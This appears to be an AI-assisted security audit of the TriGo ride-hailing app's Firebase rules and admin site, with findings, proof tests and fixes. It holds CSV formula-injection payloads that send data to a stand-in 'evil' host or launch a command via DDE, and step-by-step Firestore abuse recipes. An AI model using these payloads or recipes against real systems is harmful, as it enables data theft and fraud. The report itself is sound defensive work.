# TriGo security audit

Date: 2026-11-19 · Scope: mobile app (`src/`), admin website (`admin/`), `firestore.rules`,
`storage.rules`, `firebase.json`, `scripts/`, repository and git history, npm dependencies.
Method: read-only review plus executable proofs. Attacker model: someone with the public
Firebase web config (it is in every APK) and an ordinary passenger or driver account, calling
Firestore and Auth directly (JS SDK or REST), bypassing the app.

Nothing in the code or rules was changed. The proofs live outside the repository (see
[How to run the proofs](#how-to-run-the-proofs)); each one asserts the **secure** behaviour
and therefore **fails** against today's rules. All 13 proof tests failed for the expected
reason ("Expected request to fail, but it succeeded" / an explicit `VULNERABLE:` message),
never because of a setup error.

## Summary

| ID | Severity | Finding | Proof | Status |
|---|---|---|---|---|
| SEC-01 | **High** | Per-km booking fare is unchecked: negative fare wipes a driver's commission debt; zero/NaN/Infinity fares accepted | Failing test (debt 9000 → 0 centavos) | **Fixed** (batch A) |
| SEC-02 | Medium | Standard booking create has no key allow-list or size limit (planted `agreedFare`, 100 KB junk fields) | Failing test | **Fixed** (batch A) |
| SEC-03 | Medium | Unlimited simultaneous open bookings per passenger (request flood to every online driver) | Failing test (25/25 accepted) | **Fixed** (batch A) |
| SEC-04 | Medium | Every signed-in user can list all verified drivers with suspension reason, admin uid, live location, quota count | Failing test | Open (todo test) |
| SEC-05 | Medium | `users/{uid}` create/update: no field allow-list, no size limits, email not tied to the Auth account | Failing tests | Open (todo tests) |
| SEC-06 | Low–Medium | Coordinates and address text not range/size-checked (passenger and driver location spoofing) | Failing tests | **Fixed** for ranges/sizes (batch A); plausible spoofing Accepted |
| SEC-07 | Low | `paymentReferences` get is an oracle: tells whether any GCash reference is already used | Failing test | Open (todo test; candidate for Accepted) |
| SEC-08 | Low–Medium | Out-of-area `standardEstimatedFare` and `distanceKm` are client-chosen | Failing test | **Fixed** (batch A) |
| SEC-09 | Medium | Admin CSV export is open to formula injection (driver names, reasons) | Failing test against the shipped `csvCell` | Open (todo test) |
| SEC-10 | Medium (unverified) | Realtime Database is configured (`EXPO_PUBLIC_FIREBASE_DATABASE_URL`) but has no rules in the repo | Console check needed | **Code fixed** (cleanup, 2026-11-19); console check still open |
| SEC-11 | Low–Medium | Account deletion leaves personal data in bookings, requests, complaints, ratings, payments; deleted users can still book until Auth is removed | Code review | Open (retention decision) |
| SEC-12 | Low | Admin website has no security headers (clickjacking, no CSP) | `firebase.json` review | Open |
| SEC-13 | Low | Auth: no email verification, server-side password minimum is Firebase's 6, enumeration-friendly error text | Code review | Open (console settings) |
| SEC-14 | Low | Admin accounts have no MFA; one `admin: true` claim = full control | Design review | Open |
| SEC-15 | Low | Document "photos" are not checked to be JPEG (any 700 KB of base64) | Rules review | **Fixed** (batch A) |
| SEC-16 | Low | A driver can harvest passenger phone numbers by accept-then-cancel (up to the daily limit) | Rules review | Accepted (daily limit, admin-visible) |
| SEC-17 | Low | npm audit: highs/critical are build-time or Node-only; one deep-link DoS reaches the app | `npm audit` | Accepted until the Expo SDK 57 upgrade |

Accepted risks (Spark capstone) and things done well are at the end.

---

## Findings

### SEC-01 — High — Fare sign/range not validated; a driver can erase their commission debt

**Where:** `firestore.rules` bookings standard create (`estimatedFare is number`,
`distanceKm is number`, no range); per-km fare basis (`isValidFareBasis`: "rules cannot check
… the per-km amount"); commissions create
(`amountCentavos == math.round(finalFare * percentage)`, no sign check); commission account
update (`accruedCentavos == before + amount`).

**Attack (driver with a second, ordinary passenger account; ~5 minutes with the JS SDK):**
1. Register a passenger account (open sign-up).
2. As that passenger, create `bookings/x` with `fareBasis: 'per_km'`, `vehicleType` = the
   driver's, `estimatedFare: -900`, valid `expiresAt`.
3. As the driver (online, available): accept (T1), arrive (T2), start (T3), complete (T4) with
   the exact writes the app makes: `finalFare = -900`, commission
   `amountCentavos = -9000`, account `accruedCentavos = before − 9000`.
4. The driver's debt drops by ₱90 per ₱900 of fake negative fare; repeat until
   `accruedCentavos` ≤ `paidCentavos`. Commission suspension (`isSuspendedAccount`) never
   triggers again; reports and the earnings ledger are skewed.

Variants: `estimatedFare: 0` (free rides, zero commission); `NaN` (the trip can never be
completed because `NaN != NaN`, so a driver who starts it is stuck with `currentBookingId`
forever, a griefing attack); `Infinity`.

**Proof:** `securityProofs.test.ts` → SEC-01 (three tests). Output:
`VULNERABLE: completion accepted; accruedCentavos is now 0 (was 9000)`.

**Fix:**
- Bookings create (standard, both fare bases): `estimatedFare is number && estimatedFare > 0
  && estimatedFare <= 5000 && hasAtMostTwoDecimals(estimatedFare)`, `distanceKm > 0 &&
  distanceKm <= 200`.
- Per-km: require `perKmRate` and check `estimatedFare` against `fareSettings/active`
  (`baseFare + perKm × distanceKm`, rounded, or within ±1 centavo), which also binds the rate
  to the admin's value. Distance itself stays client-reported (see SEC-06/accepted risks).
- Defence in depth: commissions create `amountCentavos >= 0` (or `> 0`), booking T4
  `finalFare > 0`.

**Effort:** S (half a day incl. tests). **Risk of fix:** older app builds that omit
`perKmRate` (allowed today) would be refused; the booking create and T4 paths gain terms:
re-measure with `TRIGO_HEADROOM=booking` / `enforcement` (current create margin ≈ 67–76%,
T4 ≈ 50%).

### SEC-02 — Medium — Standard booking create accepts any extra fields and sizes

**Where:** bookings standard create has no `keys().hasOnly(...)` (the out-of-area create has
one).

**Attack:** create a standard booking with `agreedFare: 1` (the app's `getDisplayFare`
prefers `agreedFare`, and T4 `isExpectedFinalFare` then requires `finalFare == 1`), with
`completedAt`, `acceptedAt`, `cancelledBy` pre-filled, or with a 100 KB–1 MB junk field.
Every verified driver's open-request listener downloads each such booking: 25 bookings
× ~1 MB (with SEC-03) is ~25 MB per driver phone, and many reads against the Spark quota.

**Proof:** SEC-02 test.

**Fix:** `request.resource.data.keys().hasOnly([...exact fields the app writes...])` on the
standard create, and size caps on the string fields (`address`, see SEC-06). **Effort:** S.
**Risk:** the list must match every field current and recent app builds send (check
`bookingService.createBooking`); re-measure booking create headroom.

### SEC-03 — Medium — No limit on open bookings / requests per passenger

**Where:** bookings and outOfAreaRequests create have no "one open booking" or rate check.

**Attack:** a script creates 25+ pending bookings (or out-of-area requests) every few minutes.
Every online driver gets request alerts and a full Requests list; real passengers are buried;
each booking also costs reads for every listening driver (Spark quota, SEC-17 accepted risk).
Also enables complaint spam (one complaint per own booking).

**Proof:** SEC-03 test: `VULNERABLE: 25 simultaneous open bookings accepted`.

**Fix (pick one):**
- `passengerState/{uid}` = `{ openBookingId, updatedAt }` written in the same batch as each
  create/cancel/complete; the create rule requires `existsAfter` with this booking and
  `get(...)` before to be null or a finished booking. Also gives "one ride at a time" to the
  app.
- Cheaper rate limit: `rateLimits/{uid}.lastBookingAt`, create requires
  `request.time > last + duration.value(30, 's')` and the same batch updates it.

**Effort:** M. **Risk:** touches the booking create and cancel/complete paths (headroom,
older app builds that don't write the extra doc are refused, so deploy app first).

### SEC-04 — Medium — Verified driver records expose fields passengers don't need

**Where:** `drivers/{driverId}` `allow read: if isSignedIn() && resource.data.isVerified == true`
(get **and list**).

**Fields any signed-in user can read and list for every verified driver:** `fullName`,
`vehiclePlate`, `vehicleType`, `vehicleBrand/Model/Color`, `isOnline`, `isAvailable`,
`currentLocation` (live, while online), `currentBookingId`, `currentRequestId` (reveals who is
on a trip), `acceptedCount`, `acceptedDay`, `rating`, `profileImage`,
`suspendedAt`, `suspendedUntil`, **`suspensionReason`** (admin text, e.g. a complaint about
harassment), **`suspendedBy`**, `suspensionLiftedAt/By`, `verificationUpdatedAt/By` (admin
uids), `updatedAt`. (`verificationNote` is only set while revoked, when the record is not
readable.)

**Needed by passengers:** name, plate, vehicle details, rating for the assigned driver; online
drivers' type, availability and position for the out-of-area search; quota count only to hide
drivers at the limit. Not needed: suspension reason and admin uids; positions of drivers who
are not in a search radius.

**Attack:** one `getDocs(query(collection(db,'drivers'), where('isVerified','==',true)))`
every few seconds: a live map of every online driver plus their disciplinary record.

**Proof:** SEC-04 test.

**Fix:** move the admin-only fields to `driverStanding/{uid}` (owner + admin read): the
suspension fields and verification audit fields. `isAdminSuspended` then reads that document
(+1 `get` on T1/propose; measure headroom, current tightest margin ≈ 40.7%). Longer term:
split a public `driverPublic/{uid}` (name, plate, vehicle, rating) from the live
`driverPresence/{uid}`. **Effort:** M. **Risk:** many readers (app driver Home banner, admin
pages) and the T1/propose rules; must be done with the headroom tool.

### SEC-05 — Medium — `users/{uid}` accepts any fields, any size, any email

**Where:** users create checks only `uid`, `role == 'passenger'`, types of email/fullName/
mobileNumber; passenger update checks only that `uid`, `email`, `role`, consent and
`anonymizedAt` don't change.

**Attack:**
- Store a 500 KB `fullName` (bloats every admin page and booking card that loads it), a
  formula for SEC-09, `createdAt: 1970` (fake "Joined"), `profileImage:
  "https://attacker/track.png"` (admin's browser fetches it from the Passengers page: IP and
  time leak, no script execution), arbitrary extra keys.
- Create the profile with `email: 'ceo@trigo…'` while the Auth account is a different
  address; admin pages and the deletion flow show the profile email.
- `mobileNumber` has no format check; the contact card shared with drivers mirrors it.

**Proof:** SEC-05 tests (both fail).

**Fix:** create and update with `keys().hasOnly([...])`, `fullName.size() <= 100`,
`mobileNumber.matches('^(\\+639|09)[0-9]{9}$')`, `email == request.auth.token.email`,
`profileImage == null` (no uploads exist yet), `createdAt == request.time` on create.
**Effort:** S. **Risk:** must list every field the app writes (`createdAt`, `updatedAt`,
`profileImage`, `legalConsent`…); existing documents with extra fields would block updates
unless the rule checks only changed keys (`diff().affectedKeys().hasOnly`).

### SEC-06 — Low–Medium — Locations unbounded; GPS fully trusted

**Where:** `isValidLocation` (types only, `address` any length); drivers own update (types
only).

**Attack:** passenger books from latitude 1000 / a 600 KB address (data bloat, broken maps);
a driver sets any position (e.g. next to a busy pickup or inside the out-of-area search radius
from far away) and is listed to passengers who then wait for someone who is not there.

**Proof:** SEC-06 tests.

**Fix:** latitude −90…90, longitude −180…180, `address.size() <= 300`; optionally a Bohol
bounding box for drivers. Spoofing a *plausible* position cannot be stopped without trusted
location (see accepted risks); the 15-minute no-show cancel limits the harm. **Effort:** XS.
**Risk:** low; headroom on booking create/driver updates (a few terms).

### SEC-07 — Low — GCash reference oracle

`paymentReferences` `allow get` when `resource == null` or own. A user can test any
reference number: free → allowed, used by another driver → denied. Low value (references
are not secret to the payer), but it confirms other drivers' payments exist.
**Proof:** SEC-07 test. **Fix:** accept (documented reason: the app explains a refusal), or
answer only for the caller's own payments via a field on their own account. **Effort:** S.

### SEC-08 — Low–Medium — Out-of-area fare and distance are client-chosen

Out-of-area create checks `standardEstimatedFare > 0` and `distanceKm > 0` only; the driver's
"proposal" is locked to that number. A passenger can ask ₱0.01 for 40 km. Drivers see the
amount before proposing, so this is mostly nuisance/social engineering, but it is the "per-km
FINAL" price by policy. **Proof:** SEC-08 test. **Fix:** same as SEC-01 (bounds + check against
`fareSettings/active` per-km rate). **Effort:** S. **Risk:** OOA create headroom.

### SEC-09 — Medium — CSV formula injection in admin exports

**Where:** `admin/src/reports/reportMath.ts` `csvCell` quotes only `" , \r \n`. Exports in
`EarningsPage.tsx` include driver names (from the applicant's own `firstName/lastName`, any
characters), GCash references, rejection reasons, cash-out notes.

**Attack:** apply as a driver with first name `=HYPERLINK("http://evil/?d="&A2,"Pedro")`
(or `=cmd|' /C calc'!A0` for old Excel). After approval, the admin opens "Driver balances"
CSV in Excel/Sheets: the cell becomes a live formula (data exfiltration via link, or DDE
prompts).

**Proof:** `csvInjection.test.ts` runs the shipped `csvCell`:
`VULNERABLE: exported as "=HYPERLINK(""http://evil.example/?x=""&A1,""Pedro"")"`.

**Fix:** in `csvCell`, for string values starting with `= + - @ \t \r`, prefix `'`. Numbers
stay numbers. **Effort:** XS. **Risk:** none (negative amounts are numbers, not strings;
check `csvPeso` returns a number or keep it unprefixed).

### SEC-10 — Medium (unverified) — Realtime Database configured without rules in the repo

`EXPO_PUBLIC_FIREBASE_DATABASE_URL` is set and `src/firebase/realtimeDatabase.ts` exists, but
nothing calls `getRealtimeDatabase()` and the repo has no `database.rules.json`. If the
instance exists and was created in **test mode** (open until a date) or someone relaxed its
rules, anyone with the config can read/write it (free storage and bandwidth abuse on your
project). I did not query production.
**Fix:** Console → Realtime Database → Rules: set `{".read": false, ".write": false}` or delete
the instance; remove the env var and `realtimeDatabase.ts` if unused. **Effort:** XS.
**Risk:** none (unused).
**Status (2026-11-19, cleanup):** code part done. `src/firebase/realtimeDatabase.ts` is deleted,
the app no longer reads `EXPO_PUBLIC_FIREBASE_DATABASE_URL` or passes `databaseURL` to Firebase, and
the variable is removed from `.env.example`. Still open: the console check (lock or delete the
instance if one exists).

### SEC-11 — Low–Medium — Account deletion leaves personal data (RA 10173)

`anonymizeAndComplete` anonymizes `users`, deletes `contacts`, anonymizes `drivers` and
`driverApplications`, deletes the photos, clears warning/message reasons. It does **not**
touch:
- `bookings` and `outOfAreaRequests`: exact pickup/destination **coordinates and address
  text** (often a home), times, fares; linked by uid.
- `complaints`: the free-text `message` the user wrote, and messages others wrote about them.
- `ratings`: free-text `comment`.
- `deletionRequests.reason`, `commissionPayments.reference` (GCash reference numbers),
  `users/{uid}/legalConsents`, `users/{uid}/inboxState`.
- The **Auth account** until the admin deletes it by hand; in that window the anonymized user
  can still sign in and create bookings (booking create doesn't check `anonymizedAt`).

**Fix:** decide and document retention per collection (DATA_INVENTORY §6 still has
⟦TO FILL⟧). For a capstone: (a) add `anonymizedAt == null` to booking/request/complaint
creates (`get(userPath(...))`, +1 get), (b) blank `address` text on the user's trips in the
deletion commit (needs a new admin-only rule on bookings and requests; coordinates rounded
or kept for reports), (c) clear complaint `message`/rating `comment` written by the user.
**Effort:** M. **Risk:** new admin write paths on bookings (none exist today); batch size
(≤ 500 writes) for heavy users.

### SEC-12 — Low–Medium — No security headers on the admin website

`firebase.json` hosting has no `headers`. The admin console can be framed (clickjacking on
"Approve", "Suspend", "Confirm payment"), and there is no CSP. **Fix:** add headers for
`**`: `X-Frame-Options: DENY`, `Content-Security-Policy: frame-ancestors 'none'` (plus a
script/connect policy for Firebase once tested), `X-Content-Type-Options: nosniff`,
`Referrer-Policy: no-referrer`. **Effort:** XS (CSP proper: S). **Risk:** a strict CSP can
break Firebase Auth popups/requests if incomplete; start with the framing headers.

### SEC-13 — Low — Auth hardening

- No email verification anywhere (`sendEmailVerification` unused): accounts can be created
  with someone else's address; the driver application then carries it
  (`email == request.auth.token.email`, unverified).
- Password minimum 8 is client-only (`src/validations/auth.ts`); direct REST sign-up accepts
  Firebase's default minimum of 6.
- `auth/user-not-found` is shown as "No account found with this email", which suggests Email
  Enumeration Protection is off.

**Fix:** Console → Authentication → Settings: enable Email Enumeration Protection and a
password policy (min 8) if available on your plan; require `request.auth.token.email_verified
== true` for driver applications. **Effort:** S. **Risk:** existing unverified users would
need to verify before applying.

### SEC-14 — Low — Admin accounts: no MFA, single claim

Admin access is the `admin: true` custom claim (only set by `scripts/setAdminClaim.mjs` with
the service-account key: good). But one leaked admin password = full control (approve
drivers, confirm payments, read every phone number via `users`). No MFA, no session limit.
**Fix:** strong unique passwords now; TOTP/SMS MFA for admin accounts (Firebase Auth MFA
needs the Identity Platform upgrade; check plan limits). **Effort:** S–M.

### SEC-15 — Low — Document photos are not verified as images

The rules check size and base64 length, not content. Any 700 KB payload can be stored as
`mimeType: 'image/jpeg'`. The admin website builds a JPEG `Blob` and shows it in `<img>`, so
there is no script execution; the impact is junk/abusive content and wasted storage.
**Fix:** `request.resource.data.dataBase64.matches('^/9j/.*')` (base64 of the JPEG magic
`FF D8 FF`). **Effort:** XS. **Risk:** none for app-made JPEGs (expo-image-manipulator).

### SEC-16 — Low — Phone-number harvesting by drivers

A verified driver can accept a pending booking (contact card readable while
`accepted/arrived/in_progress`), read the passenger's name and mobile number, then cancel
(T6). Limited to the daily quota (default 20/day, cancel gives no refund) and visible to
admins. **Fix:** accept, or show the number only after `arrived`; add an admin view of
accept→cancel patterns. **Effort:** S.

### SEC-17 — Low — Dependencies (`npm audit --omit=dev`)

App: 1 critical, 10 high; admin: 5 high. Real impact:
- `@grpc/grpc-js` (via `@firebase/firestore`): Node-only transport; the React Native and
  browser SDKs use WebChannel/fetch → not reachable.
- `shell-quote` (critical), `zod`, `@expo/cli`, `re2js`: build-time tooling / CLI → not in the
  app bundle.
- `decode-uri-component`/`query-string` via `expo-router`: a crafted `trigo://` deep link
  with malformed percent-encoding can hang the app when opened (user must tap it) → Low.
  Fixed by a later Expo/expo-router (the SDK 57 upgrade already flagged by expo-doctor).
No action needed beyond the planned SDK upgrade. (npm's suggested "fix" `firebase@9.14.0`
is a downgrade; ignore it.)

---

## Checks with no finding (what an attacker cannot do)

- **Self-promotion:** clients cannot create `drivers/{uid}`, approve an application, set
  `role`, or set the `admin` claim (rules + Admin SDK only).
- **Ride state:** only the assigned driver moves a ride forward, one step at a time, with
  server times; completed/cancelled are final; a passenger cannot complete or jump states;
  passengers cannot cancel after arrival, and cancel an accepted ride only 15 minutes after
  `acceptedAt` (server time).
- **Final fare:** the driver cannot change it (`isExpectedFinalFare`); out-of-area agreed fare
  equals the request's per-km fare and the passenger cannot fabricate a driver agreement.
- **Commission:** required in the same commit as completion once settings exist; amount and
  period checked; drivers cannot confirm their own payments (admin-only), pay more than owed,
  reuse a GCash reference, or cancel a started trip to avoid it.
- **Quota/suspension/expiry:** T1 and propose check online/available/no current trip/vehicle
  type/admin and commission suspension/daily limit/expiry on server time; one booking at a
  time per driver (`currentBookingId`).
- **Settings:** fares, tariffs, commission, quota, payment, out-of-area, support contacts:
  admin-only writes with complete-object validation.
- **Other people's data:** users, contacts (only during an active trip between the two),
  bookings (own, or open/assigned for drivers), complaints (own by ID pattern), warnings,
  adminMessages, inbox state, commission and payment docs: no cross-user list query passes.
- **Ratings:** one per completed booking by its passenger within 7 days; summary sums
  checked; no edits/deletes.
- **Applications/photos:** owner-only writes, only with submit/resubmit, never while pending or
  after approval; size ≤ 700 KB; owner + admin reads; the app never reads photos back.
- **Admin XSS:** no `dangerouslySetInnerHTML`/`eval`; React escapes all user text; legal pages
  are static; `tel:` links strip non-digits.
- **Secrets:** `.env`, `secrets/`, `*.pem`, `*.p12`, `*.key` are gitignored; `git log -S` finds
  no Firebase keys, private keys or ORS keys in history (the only `AIza` hits are a regex and
  audit text; the ORS line is the `.env.example` placeholder); `secrets/serviceAccountKey.json`
  was never tracked; `admin/.env.emulator` holds demo-project values only.
- **Release logs:** personal data logs are behind `__DEV__` (one uid log guarded on
  2026-11-19); release builds log error codes and the project ID only. The admin connects to
  emulators only when `VITE_USE_EMULATORS=true` (emulator mode).

---

## Accepted risks (reasonable for a Spark-plan capstone)

| Risk | One-sentence defence answer |
|---|---|
| No App Check; quota exhaustion | "A malicious signed-in user could burn the Spark daily quota (50k reads/20k writes), which would stop the app for the day but expose no data; App Check and budget alerts are the production fix." |
| ORS key in the APK | "The OpenRouteService key must ship in the client without a backend; its worst case is someone using up our free routing quota, so a Cloud Function proxy is listed as future work." |
| Client-reported GPS and distance | "Without trusted hardware we cannot prove a phone's position; the rules bound the values, the admin per-km rate fixes the price, and the 15-minute no-show cancel limits a lying driver." |
| Collusion (driver + own passenger account) for ratings | "Fake trips need two accounts and real commission payments, and admins see every trip; detecting sockpuppets needs identity checks beyond a capstone." |
| Open bookings (addresses) visible to all verified drivers; online drivers' positions visible to signed-in users | "Drivers must see where a request is to accept it and passengers must see nearby drivers; we limit it to verified drivers, clear positions when offline, and say so in the Privacy Notice." |
| Manual Auth deletion | "Without Cloud Functions the sign-in account is deleted by an admin in the Console following a checklist, and the profile is anonymized at once." |
| Local notifications only | "Push needs Cloud Functions (Blaze); messages are always in the inbox, and a phone notification is shown while the app is running." |

## Things done well (evidence)

- **Default deny** (`match /{document=**} { allow read, write: if false; }`) and every
  collection has explicit rules.
- **Large emulator test suite:** `npm run test:rules` = **1039 passing tests** across 30
  test files (allowed and denied cases per branch); `npm run test:unit` = 587.
- **Rules cost is measured, not guessed:** `tests/rules/measureHeadroom.ts` finds the
  remaining 1000-expression budget of each valid commit (tightest path ≈ 40.7%).
- **Server time only:** every timestamp in rules is `== request.time`; periods, grace, quota
  day and expiries are computed from `request.time`, never from the phone clock.
- **Cross-document consistency in one commit:** accept + driver reservation, completion +
  commission + account + period, payment confirm + account + ledger, admin decision + inbox
  notice, anonymization + deletion request; all checked with `getAfter/existsAfter`.
- **Least-privilege contact sharing:** phone numbers only between the two parties of an
  active trip, ending the moment the trip ends.
- **Admin claim only via Admin SDK** (`scripts/setAdminClaim.mjs`), key in gitignored
  `secrets/`, never committed; the admin website checks the claim and the rules enforce it.
- **Privacy work:** versioned consent with a create-only log, deletion requests with an
  anonymizing commit, a data inventory, lock-screen-private notifications with title-only
  inbox notifications.

---

## How to run the proofs

Files (outside the repository, not committed):
- `C:\Users\Admin\AppData\Local\Temp\claude\e0c66fe06a6a013b\669d0b58-16c9-48a0-8796-f0808208aa89\scratchpad\security\securityProofs.test.ts`
  (SEC-01…SEC-08; imports `tests/rules/commissionFixtures.ts` by absolute path)
- `C:\Users\Admin\AppData\Local\Temp\claude\e0c66fe06a6a013b\669d0b58-16c9-48a0-8796-f0808208aa89\scratchpad\security\csvInjection.test.ts`
  (SEC-09; extracts `csvCell` from `admin/src/reports/reportMath.ts`)

The folder has a `node_modules` junction to the repo's `node_modules` and a
`{"type":"module"}` package.json. From the repo root:

```
npx firebase emulators:exec --only firestore --project demo-trigo-rules "node --test --test-concurrency=1 <folder>/securityProofs.test.ts <folder>/csvInjection.test.ts"
```

Result on 2026-11-19: **13 tests, 0 pass, 13 fail** (every failure = the attack succeeded).
After a fix, the matching proof should pass; copy it into `tests/rules/` as a regression test.

## Suggested order

1. SEC-01 (money) + SEC-02 + SEC-06 bounds: one rules change to booking/OOA create and
   commission, with headroom measurement.
2. SEC-09 CSV (XS) and SEC-10 RTDB console check (XS), SEC-12 framing headers (XS),
   SEC-15 JPEG magic (XS).
3. SEC-05 users allow-list.
4. SEC-04 driver field split and SEC-03 booking limit (M, headroom-sensitive).
5. SEC-11 retention decisions with the DPO; SEC-13/14 console settings.

---

## Batch A — fixed 2026-11-19 (not deployed)

One `firestore.rules` change plus minimal app changes. The audit's attacker proofs now live in
`tests/rules/security/`: `securityRegression.test.ts` (fixed findings, all passing),
`tripLimits.test.ts` (limit edges) and `openFindings.test.ts` (SEC-04, -05, -07, -09 as `todo`
tests: they run and report without failing the suite; remove `todo` when a finding is fixed).

| Finding | What the rules now require | App change |
|---|---|---|
| SEC-01 | Every new booking/request fare is `> 0`, `<= 20000` and whole centavos (NaN and Infinity fail). Per-km standard bookings: `estimatedFare` is recomputed from `fareSettings/active.fares` (or the in-code defaults while none are saved) as `round((base + perKm × distanceKm) × 100)` and must match to the centavo; a stored `perKmRate` must be that rate. Tariff bookings: equal to the tariff (unchanged). Completion: `finalFare > 0` (blocks legacy bad bookings). Commission: `amountCentavos >= 0`, so only a confirmed payment lowers a debt. | The fare is priced again with the current fare settings before booking; a changed fare is shown (FareChangedError), never sent. |
| SEC-02 | Standard booking create: exact field whitelist (the 29 fields `createStandardBooking` writes), every later field null, server `createdAt`/`updatedAt`. Locations on new bookings and requests are exactly `{latitude, longitude, address}` with `address` ≤ 200 characters. | Only those three location fields are stored (search results carried extra keys). |
| SEC-03 | One open request per passenger: `passengerOpenRequest/{uid}` = `{kind, id, updatedAt}` moves to a booking or request created in the same commit (whose create rule requires it), and only while the one it points at is no longer open (no longer pending / searching / interested / negotiating, or past `expiresAt`). Nothing clears it, so the cancel, accept and complete rules are unchanged. Owner read only; no deletes. | Booking and request creates are one batch with the pointer; a second open request shows "You already have a pending request. Cancel it or wait for it to end before booking another ride." |
| SEC-06 | Standard bookings: both ends inside a Bohol box (lat 9.4–10.25, lng 123.6–124.7; excludes Cebu City). Out-of-area: inside a Philippines box (lat 4–21.5, lng 116–127). Road distance `> 0`, `<= 300` km and between 0.9 × and 4 × + 2 km of the straight line (equirectangular, 109.6 / 110.6 km per degree). Driver positions: latitude −90…90, longitude −180…180. | The same checks run first with a clear message (`shared/bookings/limits.ts`). |
| SEC-08 | Out-of-area `standardEstimatedFare` equals the admin per-km fare for its vehicle and distance. | Priced again with the current settings; a changed fare stops with a message. |
| SEC-15 | Photo `dataBase64` starts with `/9j/` (JPEG FF D8 FF). | None (expo-image-manipulator writes JPEG). |

Constants live in `shared/bookings/limits.ts`; `tests/booking/bookingLimitsSync.test.ts` fails if
`firestore.rules` or the default fares (`src/constants`) drift from them.

**Deploy:** rules and app together. Old app builds cannot create bookings or requests once the
rules are live (they do not write the pointer); the new app cannot create them under the old
rules (`passengerOpenRequest` is denied by default). JavaScript only: a Metro reload for the
dev client; preview users need a new preview build (or an OTA update).

**Rules headroom** (`tests/rules/measureHeadroom.ts`, `TRIGO_HEADROOM=secA`, share of the
1000-expression budget left; floor 25%):

| Path | Before | After |
|---|---|---|
| Standard booking create, older shape / per-km / barangay tariff | 75.9 / 70.4 / 67.3% | 34.2 / 30.7 / 31.2% |
| Open-request pointer (new) | — | 86.4–86.9% |
| Out-of-area request create | 71.9% | 45.2% |
| Completion T4 (tightest: approved-applicant driver) | 49.7% | 48.7–49.2% |
| Commission create | 82.9% | 82.4% |
| Duty: go online | 52.3% | 48.7% |
| Photo create (submit) | 71.4% | 70.9% |
| Out-of-area confirm (unchanged rules) | 56.3 / 62.8% | 56.3 / 62.3% |
| Overall tightest (propose, approved applicant, expired admin suspension) | 40.7% | 40.7% |

The booking create paths are now the tightest booking writes (~31%); future checks on them need
a new measurement first.
